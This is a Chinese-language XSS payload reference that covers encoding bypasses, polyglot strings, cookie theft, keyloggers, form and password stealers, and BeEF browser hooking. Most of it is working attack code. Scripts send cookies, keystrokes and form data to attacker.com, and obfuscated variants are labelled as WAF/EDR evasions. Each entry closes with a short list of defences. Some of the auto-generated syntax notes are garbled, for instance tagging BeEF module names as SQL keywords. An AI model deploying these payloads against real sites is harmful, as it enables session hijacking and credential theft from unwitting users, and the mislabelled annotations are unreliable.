**概述：** XSS编码绕过利用多层编码(HTML实体、URL编码、JavaScript编码、Unicode)和浏览器的解码顺序差异，使payload在过滤器检查时不被识别但在浏览器渲染时被正确解析执行。

**漏洞原理：** XSS多层编码攻击：1)HTML实体编码(&#x6A;avascript:alert(1)) 2)双重URL编码(%253Cscript%253E) 3)JavaScript unicode转义(\u0061lert) 4)八进制/十六进制编码 5)混合编码(HTML实体+JS编码) 6)Base64 data URI(data:text/html;base64,PHN...)。

**利用方法：** 完整利用流程：
1. 分析编码处理流程
2. 选择合适的编码方式
3. 构造编码后的payload
4. 验证绕过效果

**防御措施：** 防御措施：
1. 统一编码处理
2. 避免多次解码
3. 输出时进行编码
4. 使用安全的编码函数

---

### Polyglot XSS  `xss-polyglot`
_多环境通用的XSS payload_
子类：**Polyglot** · tags: `xss` `polyglot` `universal`

**前置条件：**
- 存在XSS注入点
- 不确定具体环境

**攻击链：**

**1. 经典Polyglot**
> 经典多环境Polyglot
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
**语法解析：**
- `jaVasCript:` — JavaScript协议，大小写混合 _value_
- `/*-/*`/*\`/*` — 注释和模板字符串混淆 _value_
- `oNcLiCk=alert()` — 点击事件 _function_
- `</stYle/</titLe` — 闭合多种标签 _value_
- `<sVg/oNloAd=alert()` — SVG标签XSS _tag_

**2. 短Polyglot**
> 短版本Polyglot
```
'"-->]]>*/</script></style></title></textarea><script>alert(1)</script>
```

**3. 属性注入Polyglot**
> 属性值注入Polyglot
```
'onmouseover=alert(1) x='
"onfocus=alert(1) autofocus x="
'onclick=alert(1)//
```

**4. URL参数Polyglot**
> URL参数Polyglot
```
javascript:alert(1)//http://
data:text/html,<script>alert(1)</script>
```

**WAF/EDR 绕过变体：**

**高级Polyglot**
> 简洁高效Polyglot
```
-->'"<svg onload=alert(1)>"><script>alert(1)</script>
```
**语法解析：**
- `-->` — HTML注释结束符 _technique_
- `<svg onload=alert(1)>` — SVG事件处理器触发XSS _tag_
- `<script>alert(1)</script>` — 脚本标签执行 _tag_


**概述：** XSS Polyglot是一种在多种上下文(HTML/JS/属性/URL/CSS)中均能触发执行的通用XSS payload，一个精心构造的字符串可同时适用于不同注入点，极大提高了Fuzzing效率。

**漏洞原理：** Polyglot XSS利用HTML/JS/CSS解析器的容错机制：一个payload包含闭合引号、HTML标签、JS注释、事件处理器等多种元素，使其在作为HTML属性值、JS字符串、CSS值或URL参数时都能逃逸上下文并执行脚本。

**利用方法：** 完整利用流程：
1. 使用Polyglot探测注入点
2. 观察payload在哪个上下文执行
3. 根据结果调整攻击策略

**防御措施：** 防御措施：
1. 严格区分输入上下文
2. 针对性编码输出
3. 使用CSP策略
4. 输入验证和白名单

---

### XSS Cookie窃取  `xss-cookie-theft`
_利用XSS窃取用户Cookie_
子类：**Cookie窃取** · tags: `xss` `cookie` `theft` `session`

**前置条件：**
- 存在XSS漏洞
- Cookie未设置HttpOnly

**攻击链：**

**1. 基础Cookie窃取**
> 使用Image对象发送Cookie
```
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
```
**语法解析：**
- `new Image()` — 创建图片对象 _function_
- `.src` — 设置图片源触发HTTP请求 _value_
- `document.cookie` — 获取当前页面Cookie _function_

**2. Fetch API窃取**
> 使用Fetch/Beacon API
```
<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
<script>navigator.sendBeacon("http://attacker.com/steal", document.cookie)</script>
```
**语法解析：**
- `fetch()` — 现代HTTP请求API _function_
- `sendBeacon()` — 异步发送数据，不阻塞页面 _function_

**3. XMLHttpRequest窃取**
> 使用XHR发送
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);
xhr.send();
</script>
```
**语法解析：**
- `<script>` — HTML标签/事件处理器 _tag_
- `
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);
xhr.send();
` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_

**4. 编码传输**
> Base64编码传输
```
<script>
var data = btoa(document.cookie);
new Image().src="http://attacker.com/steal?c="+data;
</script>
```
**语法解析：**
- `btoa()` — Base64编码函数 _function_

**5. 完整利用脚本**
> 收集完整信息
```
<script>
var img = new Image();
img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
</script>
```
**语法解析：**
- `<script>` — HTML标签/事件处理器 _tag_
- `
var img = new Image();
img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_

**WAF/EDR 绕过变体：**

**混淆绕过**
> 变量混淆绕过
```
<script>var _0x1234="cookie";eval("new Image().src=\"http://attacker.com/?c="+document[_0x1234]+"\"")</script>
```
**语法解析：**
- `<script>` — HTML标签/事件处理器 _tag_
- `var _0x1234="cookie";eval("new Image().src=\"http://attacker.com/?c="+document[_0x1234]+"\"")` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_


**概述：** XSS Cookie窃取是最经典的XSS利用方式之一，通过注入的脚本读取document.cookie并发送到攻击者控制的服务器，从而劫持用户会话。HttpOnly标志可有效防御此攻击。

**漏洞原理：** Cookie窃取攻击利用JavaScript的document.cookie API读取所有未设置HttpOnly标志的Cookie，通过Image对象/fetch/XMLHttpRequest等方式将Cookie外发到攻击者服务器。获取Cookie后可直接劫持用户会话登录账户。

**利用方法：** 完整利用流程：
1. 发现XSS漏洞
2. 构造Cookie窃取脚本
3. 诱使受害者触发
4. 获取Cookie接管会话

**防御措施：** 防御措施：
1. 设置HttpOnly标志
2. 设置Secure标志
3. 使用SameSite属性
4. 实施会话绑定验证

---

### XSS键盘记录  `xss-keylogger`
_利用XSS记录用户键盘输入_
子类：**键盘记录** · tags: `xss` `keylogger` `credential`

**前置条件：**
- 存在存储型XSS
- 目标页面有敏感输入

**攻击链：**

**1. 基础键盘记录**
> 监听键盘按键
```
<script>
document.addEventListener("keypress", function(e){
  new Image().src = "http://attacker.com/log?key=" + e.key;
});
</script>
```
**语法解析：**
- `addEventListener` — 添加事件监听器 _function_
- `keypress` — 键盘按下事件 _value_
- `e.key` — 按下的键值 _value_

**2. 完整键盘记录**
> 按Enter发送记录
```
<script>
var buffer = "";
document.addEventListener("keydown", function(e){
  if(e.key === "Enter"){
    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);
    buffer = "";
  } else {
    buffer += e.key;
  }
});
</script>
```
**语法解析：**
- `<script>` — HTML标签/事件处理器 _tag_
- `
var buffer = "";
document.addEventListener("keydown", function(e){
  if(e.key === "Enter"){
    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);
    buffer = "";
  } else {
    buffer += e.key;
  }
});
` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_

**3. 表单窃取**
> 窃取密码字段
```
<script>
document.querySelectorAll("input[type=password]").forEach(function(input){
  input.addEventListener("change", function(){
    new Image().src = "http://attacker.com/log?pwd=" + this.value;
  });
});
</script>
```
**语法解析：**
- `querySelectorAll` — 选择所有匹配元素 _function_
- `input[type=password]` — 密码输入框选择器 _value_
- `change` — 值改变事件 _value_

**4. 表单提交劫持**
> 劫持表单提交
```
<script>
document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();
  });
});
</script>
```
**语法解析：**
- `<script>` — HTML标签/事件处理器 _tag_
- `
document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();
  });
});
` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_

**WAF/EDR 绕过变体：**

**混淆版本**
> 十六进制混淆
```
<script>var _0xa=["\x6b\x65\x79\x64\x6f\x77\x6e","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})</script>
```
**语法解析：**
- `<script>` — HTML标签/事件处理器 _tag_
- `var _0xa=["\x6b\x65\x79\x64\x6f\x77\x6e","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_


**概述：** XSS键盘记录器通过注入JavaScript事件监听器捕获用户的所有键盘输入，包括密码、信用卡号等敏感信息，并实时发送给攻击者，比Cookie窃取危害更大且更隐蔽。

**漏洞原理：** XSS键盘记录利用addEventListener监听keypress/keydown/input事件，捕获用户在页面上的所有键盘输入。攻击者可针对特定输入框(如密码框)监听，将捕获的按键通过Image beacon或WebSocket实时外发，用户完全无感知。

**利用方法：** 完整利用流程：
1. 注入键盘记录脚本
2. 持续收集按键数据
3. 发送到攻击者服务器
4. 分析获取敏感信息

**防御措施：** 防御措施：
1. 严格的XSS防护
2. 使用虚拟键盘输入敏感信息
3. 实施内容安全策略
4. 监控异常脚本行为

---

### BeEF框架利用  `xss-beef`
_使用BeEF框架进行XSS利用_
子类：**BeEF利用** · tags: `xss` `beef` `framework` `exploitation`

**前置条件：**
- 存在XSS漏洞
- 部署BeEF服务器

**攻击链：**

**1. 部署BeEF**
> 部署BeEF服务器
_platform: linux_
```
# 安装BeEF
git clone https://github.com/beefproject/beef
cd beef
bundle install
./beef

# 默认运行在 http://localhost:3000
# 默认用户名: beef
# 默认密码: beef
```
**语法解析：**
- `# 安装BeEF
git clone https://github.com/beefproject/beef
cd beef
bundle install` — 攻击载荷 _value_

**2. 注入Hook脚本**
> 注入BeEF Hook
```
<script src="http://attacker.com:3000/hook.js"></script>
注入短版本:
<script src="//attacker.com:3000/hook.js"></script>
```
**语法解析：**
- `hook.js` — BeEF的Hook脚本 _value_
- `attacker.com:3000` — BeEF服务器地址 _domain_

**3. 常用命令**
> BeEF控制台命令
```
# BeEF控制台常用命令
# 查看在线僵尸
beef> online_browsers

# 执行命令
beef> run social_engineering fake_notification

# 获取Cookie
beef> run browser get_cookies

# 重定向页面
beef> run browser redirect https://evil.com
```
**语法解析：**
- `# BeEF控制台常用命令
# 查看在线僵尸
beef> online_browsers

# 执行命令
beef> run social_engin` — 攻击载荷 _value_

**4. 模块利用**
> BeEF模块列表
```
# 常用模块
# 社会工程学
- Fake Notification
- Fake Flash Update
- Pretty Theft

# 浏览器攻击
- Get Cookie
- Redirect Browser
- TabNabbing

# 网络攻击
- DNS Spoofing
- Ping Sweep
- Port Scanner
```
**语法解析：**
- `# 常用模块
# 社会工程学
- Fake Notification
- Fake Flash ` — SQL表达式 _value_
- `Update` — SQL关键字 _keyword_
- `
- Pretty Theft

# 浏览器攻击
- Get Cookie
- Redirect Browser
- TabNabbing

# 网络攻击
- DNS Spoofing
- Ping Sweep
- Port Scanner` — SQL表达式 _value_

**WAF/EDR 绕过变体：**

**混淆Hook URL**
> Base64混淆Hook注入
```
<script>eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=="))</script>
```
**语法解析：**
- `<script>` — HTML标签/事件处理器 _tag_
- `eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=="))` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_


**概述：** BeEF(Browser Exploitation Framework)是一个开源的浏览器利用框架，通过XSS注入hook.js脚本控制受害者浏览器，可执行内网扫描、键盘记录、社工攻击、漏洞利用等数百种后渗透操作。

**漏洞原理：** BeEF利用一段JavaScript hook脚本(hook.js)建立与C2服务器的WebSocket长连接，将受害者浏览器变为僵尸节点。可执行的操作包括：获取浏览器信息、截屏、重定向、表单注入、内网端口扫描、ARP欺骗(WebRTC)等。

**利用方法：** 完整利用流程：
1. 部署BeEF服务器
2. 注入Hook脚本
3. 受害者上线
4. 使用模块进行攻击

**防御措施：** 防御措施：
1. 严格的XSS防护
2. 使用CSP限制外部脚本
3. 监控异常网络连接
4. 安全意识培训

---
